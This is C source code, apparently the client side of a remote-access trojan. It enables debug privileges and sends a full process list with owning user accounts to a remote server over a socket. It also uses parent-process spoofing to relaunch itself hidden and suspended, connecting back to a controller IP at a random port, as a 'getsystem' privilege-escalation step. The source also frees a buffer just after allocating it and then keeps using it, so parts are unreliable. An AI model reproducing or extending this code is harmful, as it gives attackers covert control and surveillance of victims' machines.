#include "process.h"

// 指定发送地址
extern char ip[25];

// 启用调试权限
void EnableDebugAbility()
{
	// 令牌句柄
	HANDLE hProcessToken = NULL;
	// 1.打开进程访问令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hProcessToken))
	{
		return;
	}

	// 2.取得SeDebugPrivilege特权的LUID值
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		return;
	}

	// 3.调整访问令牌特权
	TOKEN_PRIVILEGES token;
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	// 使特权有效
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hProcessToken, FALSE, &token, 0, NULL, NULL))
	{
		return;
	}

	CloseHandle(hProcessToken);
	return;
}

// 获取域名\用户名
void GetAccount(PSID userSid, char buffer[])
{
	// 用户名
	TCHAR userName[255];
	DWORD bufferLen = 255;
	// 域名
	TCHAR domainName[255];
	DWORD domainNameBufferLen = 255;
	SID_NAME_USE peUse;

	// 成功获取
	if (LookupAccountSid(NULL, userSid, userName, &bufferLen, domainName, &domainNameBufferLen, &peUse))
	{
		char tempDomainName[255];
		char tempUserName[255];

		// 先转成char *
		TcharToStr(domainName, tempDomainName);
		TcharToStr(userName, tempUserName);

		// 拼接域名\用户名
		strcat(buffer, tempDomainName);
		strcat(buffer, "\\");
		strcat(buffer, tempUserName);
		return;
	}

	// 失败 buffer赋值为空格
	strcat(buffer, " ");
}

// 获取进程列表指针
PWTS_PROCESS_INFO_EX GetProcessList(DWORD* processCnt)
{
	DWORD level = 1;
	// 保存进程信息
	PWTS_PROCESS_INFO_EX processList = NULL;
	WTSEnumerateProcessesEx(WTS_CURRENT_SERVER_HANDLE, &level, WTS_ANY_SESSION, (LPTSTR*)&processList, processCnt);
	return processList;
}

// 获取指定PID进程的位数
int GetProcessPlatform(DWORD dwProcessID)
{
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	static LPFN_ISWOW64PROCESS fnIsWow64Process = NULL;

	if (NULL == fnIsWow64Process)
	{
		HMODULE hKernel32 = GetModuleHandle(L"kernel32");
		if (NULL == hKernel32)
		{
			return 0;
		}

		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process");
		if (NULL == fnIsWow64Process)
		{
			return 0;
		}
	}

	static UINT OSPlatform = 0;
	if (0 == OSPlatform)
	{
		HANDLE hCurProcess = GetCurrentProcess();
		if (NULL == hCurProcess)
		{
			return 0;
		}

		BOOL bWow64 = FALSE;
		BOOL bError = fnIsWow64Process(hCurProcess, &bWow64);
		CloseHandle(hCurProcess);
		if (FALSE == bError)
		{
			return 0;
		}

#ifdef _WIN64
		OSPlatform = 64;
#else
		OSPlatform = bWow64 ? 64 : 32;
#endif // _WIN64
	}

	if (32 == OSPlatform)
	{
		return 32;
	}


	UINT uRet = 0;
	HANDLE hDstProcess = NULL;
	BOOL bError = FALSE;
	BOOL bWow64 = FALSE;

	hDstProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
	if (NULL == hDstProcess)
	{
		goto FUN_CLEANUP;
	}

	bError = fnIsWow64Process(hDstProcess, &bWow64);
	if (FALSE == bError)
	{
		goto FUN_CLEANUP;
	}

	uRet = bWow64 ? 32 : 64;

FUN_CLEANUP:
	if (NULL != hDstProcess)
	{
		CloseHandle(hDstProcess);
		hDstProcess = NULL;
	}

	return uRet;
}

// 查看进程信息命令
BOOL PS(SOCKET sServer, char cmd[])
{
	// 是否执行ps命令
	if (_strnicmp(cmd, "ps", 2) != 0)
		return FALSE;

	// 尝试拿到调试权限
	EnableDebugAbility();

	// 进程数
	DWORD processCnt = 0;
	// 获取列表指针
	PWTS_PROCESS_INFO_EX processList = GetProcessList(&processCnt);
	// 发送错误信息给对方
	if (!processList)
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 保存结构体指针
	PWTS_PROCESS_INFO_EX tempList = processList;
	// 第一个进程是系统进程没必要发送
	tempList++;

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	processCnt--;

	// 发送进程数
	IntToStr(processCnt, buffer);
	SendData(sServer, buffer, sizeof(buffer));

	// 发送进程信息
	for (DWORD i = 0; i < processCnt; i++)
	{
		// 发送PID
		IntToStr(tempList->ProcessId, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// 发送进程名
		LpwstrToStr(tempList->pProcessName, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// 发送位数
		int arch = GetProcessPlatform(tempList->ProcessId);
		if (arch == 0)
			strcat(buffer, " ");
		else if (arch == 32)
			strcat(buffer, "x86");
		else
			strcat(buffer, "x64");

		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// 发送域名\用户名
		GetAccount(tempList->pUserSid, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		Sleep(2);
		// 移到下一个进程
		tempList++;
	}


	Sleep(10);
	// 释放内存
	WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, processList, processCnt);
	processList = NULL;
	return TRUE;
}

// 父进程欺骗
BOOL PPIDSpoofing(SOCKET sServer,DWORD PID)
{
	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, PID);
	// 打开进程失败
	if (!hProcess)
	{
		return FALSE;
	}

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	// 初始化
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&si.StartupInfo, sizeof(STARTUPINFO));
	si.StartupInfo.cb = sizeof(STARTUPINFO);
	si.StartupInfo.wShowWindow = SW_HIDE;
	si.StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	SIZE_T lpsize = 0;
	// 获取要分配的 属性列表 大小
	InitializeProcThreadAttributeList(NULL, 1, 0, &lpsize);

	char* temp = (char*)malloc(sizeof(char) * lpsize);

	/* 转换指针到正确类型 */
	si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)temp;
	free(temp);

	/* 真正为结构体初始化属性参数 */
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &lpsize);

	/* 更新属性表 */
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
	{
		return FALSE;
	}

	/* 启动一个新的client.exe */

	// 获取client.exe 完整路径
	TCHAR tempPath[MAX_PATH];
	GetModuleFileName(NULL, tempPath, MAX_PATH);
	// 转换成char *格式
	char currentPath[MAX_PATH] = { 0 };
	TcharToStr(tempPath, currentPath);

	// 随机生成10000-65535 之间的端口
	char port[10] = { 0 };
	IntToStr(randomNumber(10000, 65535), port);

	// 进行命令的拼接
	char cmdLine[MAX_PATH] = "cmd.exe /c ";
	strcat(cmdLine, "\"");
	strcat(cmdLine, currentPath);
	strcat(cmdLine, "\" ");
	// 拼接ip
	strcat(cmdLine, ip);
	strcat(cmdLine, " ");
	// 拼接端口
	strcat(cmdLine, port);

	// cmd打开client.exe失败							挂起进程
	if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&si.StartupInfo, &pi))
	{
		return FALSE;
	}

	// 以上代码如果执行成功，说明父进程欺骗完成

	// 以下代码能不能成功，完全看对方进程是否启动成功

	// 发送端口给对方
	SendData(sServer, port, sizeof(port));
	// 对方启动进程成功
	if (!IsRecvError(sServer))
	{
		// 恢复线程
		ResumeThread(pi.hThread);
		printf("getsystem sucess\n");
	}

	// 收尾处理
	CloseHandle(pi.hProcess);
	CloseHandle(hProcess);
	CloseHandle(pi.hThread);
	DeleteProcThreadAttributeList(si.lpAttributeList);
	return TRUE;
}

